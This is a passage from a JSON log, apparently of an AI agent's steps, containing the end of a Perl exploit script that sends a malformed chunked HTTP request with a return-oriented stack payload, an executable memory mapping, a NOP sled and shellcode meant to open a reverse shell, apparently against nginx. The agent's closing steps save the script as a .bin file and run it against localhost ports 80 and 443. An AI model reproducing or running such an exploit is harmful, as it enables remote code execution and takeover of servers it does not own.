pack(\"V\", $memset)\n        \t\t . pack(\"V\", $pop3ret)\n        \t\t . pack(\"V\", $copyaddress)\n        \t\t . $byte . \"\\x00\\x00\\x00\"\n        \t\t . \"\\x01\\x00\\x00\\x00\";\n\t$copyaddress++;\n}\nfor ($q=0;$q<10;$q++) {\nprint \"bin search done \";\nsleep(1);\ntwinkle();\nprint \"\\r\"\n}\nprint \"\\n\";\nprint \"See reverse handler for success\\n\";\nagain6:\n$sock = IO::Socket::INET->new(PeerAddr => $target,\n                          PeerPort => $targetport,\n                          Proto    => 'tcp') || {goto again6};\nsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n$req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n      .\"Connection: close\\r\\n\"\n      .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n$req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n$stack = pack(\"V\", $mmap64)\n\t. $largepopret\n \t.\"\\x00\\x00\\x00\\x10\" # mmap start\n \t.\"\\x00\\x10\\x00\\x00\" # mmap size\n \t.\"\\x07\\x00\\x00\\x00\" # mmap prot\n \t.\"\\x32\\x00\\x00\\x00\" # mmap flags\n \t.\"\\xff\\xff\\xff\\xff\" # mmap fd\n \t.\"\\x00\\x00\\x00\\x00\" # mmap offset\n \t.\"\\x00\\x00\\x00\\x00\" # mmap offset\n \t. $popblock\n \t. $memsetcode\n\t. \"\\x00\\x00\\x00\\x10\" # JUMP TO 0x10000000 (rwxp addr)\n\t. \"\\x90\" x 100 . $lnxcbsc;\n#$p = <stdin>;\nprint $sock $req;\nsend($sock, \"A\" x ($align-1024) . $stack . \"A\" x 1000, MSG_OOB);\t\t\nclose($sock);\n\ngoto again6; # XXX\nmy $current = 0; \nsub twinkle { \n$cursors[0] = \"|\";\n$cursors[1] = \"/\";\n$cursors[2] = \"-\";\n$cursors[3] = \"\\\\\";\nprint \"$cursors[$current++]\\b\";\nif ($current > 3) {\n\t$current = 0;\n} \n}"
    },
    {
        "type": "thought",
        "content": "Save it as a .bin file and use perl to run it."
    },
    {
        "type": "execution",
        "content": "perl ngxunlock_pl.bin localhost 80 localhost 443"
    }
]